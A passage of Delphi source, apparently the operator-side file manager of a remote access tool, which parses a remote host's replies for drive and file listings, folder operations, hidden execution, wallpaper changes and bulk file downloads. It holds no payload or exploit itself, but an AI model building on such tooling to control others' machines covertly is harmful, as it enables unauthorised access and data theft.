      TempStr1 := copy(recebido, 1, posex(delimitadorComandos, Recebido) - 1);
      delete(recebido, 1, posex(delimitadorComandos, Recebido) - 1);
      delete(recebido, 1, length(delimitadorComandos));

      if TempStr1 <> '' then
      begin
        TempNode := TreeView1.Items.AddChild(SpecialNode, TempStr1);
        TempNode.ImageIndex := FormMain.FileManagerSpecialIcons[TempInt];
        TempNode.SelectedIndex := TempNode.ImageIndex;
      end;

      TreeView1.Refresh;
    end;
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMDRIVELIST then
  begin
    delete(recebido, 1, posex('|', recebido));

    TreeView1.Enabled := true;
    ListView1.Enabled := true;
    TempNode := TreeView1.Items.Item[0];
    while Recebido <> '' do
    begin
      TempStr := Copy(Recebido, 1, posex(#13#10, Recebido) - 1);
      delete(Recebido, 1, posex(#13#10, Recebido) + 1);
      Result := SplitString(TempStr, delimitadorComandos);
      DriveLetter := Result[0];
      if Result[1] <> '' then TamanhoTotal := StrToInt(Result[1]) else TamanhoTotal := 0;
      if Result[2] <> '' then TamanhoUsado := StrToInt(Result[2]) else TamanhoUsado := 0;
      SistemaArquivo := Result[3];
      DriveType := Result[4];
      VolumeName := Result[5];

      if SistemaArquivo <> '' then SistemaArquivo := ' ' + traduzidos[356] + ': (' + SistemaArquivo + ') ';
      if VolumeName <> '' then VolumeName := ' ' + traduzidos[357] + ': (' + VolumeName + ') ';

      Tn := Treeview1.Items.AddChild(TempNode, DriveLetter);
      case strtoint(DriveType) of
        DRIVE_UNKNOWN: Tn.ImageIndex := FormMain.FileManagericon[7];
        DRIVE_REMOVABLE: Tn.ImageIndex := FormMain.FileManagericon[0];
        DRIVE_FIXED: Tn.ImageIndex := FormMain.FileManagericon[1];
        DRIVE_REMOTE: Tn.ImageIndex := FormMain.FileManagericon[2];
        DRIVE_CDROM: Tn.ImageIndex := FormMain.FileManagericon[3];
        DRIVE_RAMDISK: Tn.ImageIndex := FormMain.FileManagericon[8];
      end;
      Tn.SelectedIndex := Tn.ImageIndex;

      if (TamanhoUsado > 0) and (TamanhoTotal > 0) then
      TempStr := DriveLetter + SistemaArquivo + VolumeName + ' ' +
                 traduzidos[358] + ': ' + FileSizeToStr(TamanhoTotal) + ' / ' +
                 traduzidos[359] + ': ' + FileSizeToStr(TamanhoUsado) else
      TempStr := DriveLetter + SistemaArquivo + VolumeName;

      Dados := TDirDados.Create;
      Dados.Info := TempStr;

      Tn.Data := TOBject(Dados);
    end;
    TempNode.Expand(false);
    statusbar1.Panels.Items[0].Text := traduzidos[360];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMFILELIST then
  begin
    while FMFILELIST_STARTED = true do Application.ProcessMessages;
    FMFILELIST_STARTED := true;

    delete(recebido, 1, posex('|', recebido));
    TempNode := (SelectedNode[StrToInt(Copy(Recebido, 1, posex('|', recebido) - 1))]);
    delete(recebido, 1, posex('|', recebido));
    try
    Stream := TMemoryStream.Create;
    Stream.WriteBuffer(pointer(Recebido)^, Length(Recebido) * 2);
    Stream.Position := 0;

    if Prviadasimagens1.Checked = true then
    begin
      if FMTHUMBS_STARTED = true then
      begin
        FMTHUMBS_STARTED := false;
        ListView1.Items.EndUpdate;
      end;

      //ListView1.Items.Clear;
      ListView1.LargeImages := ImageListListView;
      ListView1.SmallImages := ImageListListView;
      Prviadasimagens1.Checked := false;
      Servidor.EnviarString(FMTHUMBS + '|'); // se houver uma thread ativa, ela irá ser finalizada
      //if FMFILELIST_STARTED = false then ListView1.Items.Clear;
    end;

    ListView1.Items.BeginUpdate;

    //i := GetTickCount;
    If Stream.Size > 0 then LoadFiles(Stream, TempNode);
    finally
    Stream.Free;
    end;

    //MessageBox(Handle, pchar(inttostr(gettickcount - i)), '', 0);

    //i := GetTickCount;
    UpdateFileIcons(ListView1);
    //MessageBox(Handle, pchar(inttostr(gettickcount - i)), '', 0);

    ListView1.Items.EndUpdate;
    statusbar1.Panels.Items[0].Text := traduzidos[361] + ' ' + Inttostr(ListView1.Items.Count) + ' ' + traduzidos[362];

    FMFILELIST_STARTED := false;
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMFILELIST2 then
  begin
    while FMFILELIST_STARTED = true do Application.ProcessMessages;
    FMFILELIST_STARTED := true;

    delete(recebido, 1, posex('|', recebido));
    TempStr := Copy(Recebido, 1, posex('|', recebido) - 1);
    delete(recebido, 1, posex('|', recebido));
     try
    Stream := TMemoryStream.Create;
    Stream.WriteBuffer(pointer(Recebido)^, Length(Recebido) * 2);
    Stream.Position := 0;

    if Prviadasimagens1.Checked = true then
    begin
      if FMTHUMBS_STARTED = true then
      begin
        FMTHUMBS_STARTED := false;
        ListView1.Items.EndUpdate;
      end;

      //ListView1.Items.Clear;
      ListView1.LargeImages := ImageListListView;
      ListView1.SmallImages := ImageListListView;
      Prviadasimagens1.Checked := false;
      Servidor.EnviarString(FMTHUMBS + '|'); // se houver uma thread ativa, ela irá ser finalizada
      //if FMFILELIST_STARTED = false then ListView1.Items.Clear;
    end;

    ListView1.Items.BeginUpdate;

    //i := GetTickCount;
    If Stream.Size > 0 then LoadFiles2(Stream, TempStr);
     finally
     Stream.Free;
     end;

    //MessageBox(Handle, pchar(inttostr(gettickcount - i)), '', 0);

    //i := GetTickCount;
    UpdateFileIcons(ListView1);
    //MessageBox(Handle, pchar(inttostr(gettickcount - i)), '', 0);

    ListView1.Items.EndUpdate;
    statusbar1.Panels.Items[0].Text := traduzidos[361] + ' ' + Inttostr(ListView1.Items.Count) + ' ' + traduzidos[362];

    FMFILELIST_STARTED := false;
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMFILESEARCHLIST then
  begin
    if ConAux.MasterIdentification = 1234567890 then
    try
      ConAux.Connection.Disconnect;
      except
    end;
    while FMFILESEARCHLIST_STARTED = true do Application.ProcessMessages;
    FMFILESEARCHLIST_STARTED := true;

    delete(recebido, 1, posex('|', recebido));

    ListView2.Items.BeginUpdate;
    if ListView2.Items.Count > 0 then ListView2.Items.Clear;
    If length(recebido) > 0 then LoadSearchFiles(Recebido);
    UpdateFileIcons(ListView2);
    ListView2.Items.EndUpdate;

    statusbar1.Panels.Items[0].Text := traduzidos[361] + ' ' + Inttostr(ListView2.Items.Count) + ' ' + traduzidos[362];
    Button1.Enabled := true;
    Button2.Enabled := false;

    FMFILESEARCHLIST_STARTED := false;
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMFOLDERLIST then
  begin
    while FMFOLDERLIST_STARTED = true do Application.ProcessMessages;
    FMFOLDERLIST_STARTED := true;

    delete(recebido, 1, posex('|', recebido));
    TempNode := (SelectedNode[StrToInt(Copy(Recebido, 1, posex('|', recebido) - 1))]);
    delete(recebido, 1, posex('|', recebido));
    Treeview1.Items.BeginUpdate;
    try
    Stream := TMemoryStream.Create;
    Stream.WriteBuffer(pointer(Recebido)^, Length(Recebido) * 2);
    Stream.Position := 0;
    if Stream.Size > 0 then LoadFolders(Stream, TempNode);
    finally
    Stream.Free;
    end;

    Treeview1.Items.EndUpdate;
    statusbar1.Panels.Items[0].Text := traduzidos[361] + ' ' + Inttostr(TempNode.Count) + ' ' + traduzidos[363];

    FMFOLDERLIST_STARTED := false;
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMFOLDERLIST2 then
  begin
    while FMFILELIST_STARTED = true do Application.ProcessMessages;
    FMFILELIST_STARTED := true;

    delete(recebido, 1, posex('|', recebido));
    TempStr := Copy(Recebido, 1, posex('|', recebido) - 1);
    delete(recebido, 1, posex('|', recebido));

    if Prviadasimagens1.Checked = true then
    begin
      if FMTHUMBS_STARTED = true then
      begin
        FMTHUMBS_STARTED := false;
        ListView1.Items.EndUpdate;
      end;

      //ListView1.Items.Clear;
      ListView1.LargeImages := ImageListListView;
      ListView1.SmallImages := ImageListListView;
      Prviadasimagens1.Checked := false;
      Servidor.EnviarString(FMTHUMBS + '|'); // se houver uma thread ativa, ela irá ser finalizada
      //if FMFILELIST_STARTED = false then ListView1.Items.Clear;
    end;

    ListView1.Items.BeginUpdate;
    try
    Stream := TMemoryStream.Create;
    Stream.WriteBuffer(pointer(Recebido)^, Length(Recebido) * 2);
    Stream.Position := 0;
    if Stream.Size > 0 then LoadFolders2(Stream, TempStr);
    finally
    Stream.Free;
    end;

    ListView1.Items.EndUpdate;
    statusbar1.Panels.Items[0].Text := traduzidos[361] + ' ' + Inttostr(ListView1.Items.Count) + ' ' + traduzidos[363];

    FMFILELIST_STARTED := false;
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMCRIARPASTA then
  begin
    delete(recebido, 1, posex('|', recebido));

    TempNode := (SelectedNode[StrToInt(Copy(Recebido, 1, posex('|', recebido) - 1))]);
    delete(recebido, 1, posex('|', recebido));

    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(recebido, 1, posex('|', recebido));

    if TempStr = 'T' then
    begin
      delete(recebido, 1, lastdelimiter('\', recebido));

      Tn := TreeView1.Items.AddChild(TempNode, recebido);
      Tn.ImageIndex := FolderIcon;
      Tn.SelectedIndex := FolderIconSelected;

      statusbar1.Panels.Items[0].Text := traduzidos[364];
      TreeView1.Refresh;
    end else
    statusbar1.Panels.Items[0].Text := traduzidos[365] + ' "' + recebido + '"';
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMRENOMEARPASTA then
  begin
    delete(recebido, 1, posex('|', recebido));

    TempNode := (SelectedNode[StrToInt(Copy(Recebido, 1, posex('|', recebido) - 1))]);
    delete(recebido, 1, posex('|', recebido));

    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(recebido, 1, posex('|', recebido));

    if TempStr = 'T' then
    begin
      recebido := Copy(recebido, 1, lastdelimiter('\', recebido) - 1);
      delete(recebido, 1, lastdelimiter('\', recebido));

      TempNode.Text := recebido;
      TreeView1.Refresh;
      EnviarListarDir(TempNode);

      statusbar1.Panels.Items[0].Text := traduzidos[366];
    end else
    statusbar1.Panels.Items[0].Text := traduzidos[367] + ' "' + recebido + '"';
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMDELETARPASTA then
  begin
    delete(recebido, 1, posex('|', recebido));

    TempNode := (SelectedNode[StrToInt(Copy(Recebido, 1, posex('|', recebido) - 1))]);
    delete(recebido, 1, posex('|', recebido));

    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(recebido, 1, posex('|', recebido));

    if TempStr = 'T' then
    begin
      if ListView1.Items <> nil then
      If ExtractFilePath(TFileDados(ListView1.Items.Item[0].Data).FileName) = GetFullPath(TempNode) then
      if ListView1.Items.Count > 0 then ListView1.Items.Clear;

      TempNode.Delete;
      statusbar1.Panels.Items[0].Text := traduzidos[368];
      TreeView1.Refresh;
    end else
    statusbar1.Panels.Items[0].Text := traduzidos[369] + ' "' + recebido + '"';
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMDELETARARQUIVO then
  begin
    delete(recebido, 1, posex('|', recebido));
    while recebido <> '' do
    begin
      TempStr := Copy(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
      delete(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
      delete(Recebido, 1, length(delimitadorComandos));
      if ListView1.Items.Count > 0 then
      begin
        for i := 0 to ListView1.Items.Count - 1 do
        if TFileDados(ListView1.Items.Item[i].Data).FileName = TempStr then
        begin
          ListView1.Items.Item[i].Delete;
          break;
        end;
      end;
    end;
    statusbar1.Panels.Items[0].Text := traduzidos[373];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMEXECPARAM then
  begin
    delete(recebido, 1, posex('|', recebido));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(recebido, 1, posex('|', recebido));

    if TempStr = 'T' then statusbar1.Panels.Items[0].Text := traduzidos[371] + ' "' + recebido + '"' else
    statusbar1.Panels.Items[0].Text := traduzidos[370] + ' "' + recebido + '"';
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMEDITARARQUIVO then
  begin
    delete(recebido, 1, posex('|', recebido));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(recebido, 1, posex('|', recebido));

    TempStr1 := Copy(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(delimitadorComandos));

    if TempStr = 'T' then
    begin
      for i := 0 to ListView1.Items.Count - 1 do
      if TFileDados(ListView1.Items.Item[i].Data).FileName = TempStr1 then
      begin
        TFileDados(ListView1.Items.Item[i].Data).FileName := Recebido;
        ListView1.Items.Item[i].Caption := ExtractFileName(Recebido);
      end;
    end else
    statusbar1.Panels.Items[0].Text := traduzidos[374] + ' "' + TempStr1 + '"';
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMEXECNORMAL then
  begin
    statusbar1.Panels.Items[0].Text := traduzidos[373];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMEXECHIDE then
  begin
    statusbar1.Panels.Items[0].Text := traduzidos[373];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMWALLPAPER then
  begin
    delete(recebido, 1, posex('|', recebido));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(recebido, 1, posex('|', recebido));
    if TempStr = 'T' then statusbar1.Panels.Items[0].Text := traduzidos[375] + ' "' + Recebido + '"' else
    statusbar1.Panels.Items[0].Text := traduzidos[376] + ' "' + Recebido + '"';
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMCOPYFILE then
  begin
    delete(recebido, 1, posex('|', recebido));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(recebido, 1, posex('|', recebido));
    if TempStr = 'T' then statusbar1.Panels.Items[0].Text := traduzidos[609] + ' "' + Recebido + '"' else
    statusbar1.Panels.Items[0].Text := traduzidos[610] + ' "' + Recebido + '"';
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMCOPYFOLDER then
  begin
    delete(recebido, 1, posex('|', recebido));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(recebido, 1, posex('|', recebido));
    if TempStr = 'T' then statusbar1.Panels.Items[0].Text := traduzidos[611] + ' "' + Recebido + '"' else
    statusbar1.Panels.Items[0].Text := traduzidos[612] + ' "' + Recebido + '"';
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMDOWNLOADALL then
  begin
    delete(recebido, 1, posex('|', recebido));
    if Recebido = '' then
    begin
      //Messagebox(Handle, 'Não foram encontrados arquivos para download', 'File Manager', MB_OK + MB_ICONINFORMATION);
      exit;
    end;
     try
    Stream := TMemoryStream.Create;
    Stream.Write(Recebido[1], Length(Recebido) * 2);
    Stream.Position := 0;
    ForceDirectories(ExtractFilePath(DownloadAllFile));
    Stream.SaveToFile(DownloadAllFile);
     finally
      Stream.Free;
     end;


    if FileExists(DownloadAllFile) then
    begin
      FillChar(RecDownloadAll, SizeOf(RecDownloadAll), #0);
      try
      Stream := TMemoryStream.Create;
      Stream.LoadFromFile(DownloadAllFile);
      Stream.Position := 0;
      Stream.Read(RecDownloadAll, SizeOf(TRecDownloadAll));
      SetLength(TempStr, (Stream.Size - Stream.Position) div 2);
      Stream.Read(TempStr[1], Stream.Size);
      finally
      Stream.Free;
      end;


      FormDownloadAll.ListView2.Items.Clear;

      SendMessage(FormDownloadAll.Handle, 5557, cardinal(TempStr), 0);
      SendMessage(FormDownloadAll.Handle, 5558, cardinal(@RecDownloadAll), 0);
      Application.ProcessMessages;

      FormDownloadAll.LoadDownloadFiles;

      UpdateFileIcons(FormDownloadAll.ListView2);

      FormDownloadAll.RadioGroup1.ItemIndex := RecDownloadAll.Option;
      FormDownloadAll.Edit1.Clear;
      FormDownloadAll.Edit1.Text := RecDownloadAll.Filter;
      FormDownloadAll.RadioGroup1.Enabled := False;
      FormDownloadAll.Edit1.Enabled := False;
      FormDownloadAll.Button1.Enabled := False;

      if FormDownloadAll.Visible = True then FormDownloadAll.BringToFront else
      FormDownloadAll.Show;
    end;
    //Messagebox(Handle, 'O arquivo DownloadAllFile foi criado...', 'File Manager', MB_OK + MB_ICONINFORMATION);
  end else

end;

procedure TFormFileManager.Parar1Click(Sender: TObject);
var
  Node: pVirtualNode;
begin
  if VirtualStringTree1.SelectedCount <= 0 then Exit;

  Node := VirtualStringTree1.GetFirstSelected;
  while Assigned(Node) do
  begin
    PararTransferencia(Node);
    Node := VirtualStringTree1.GetNextSelected(Node);
  end;
  VirtualStringTree1.Refresh;
end;

end.

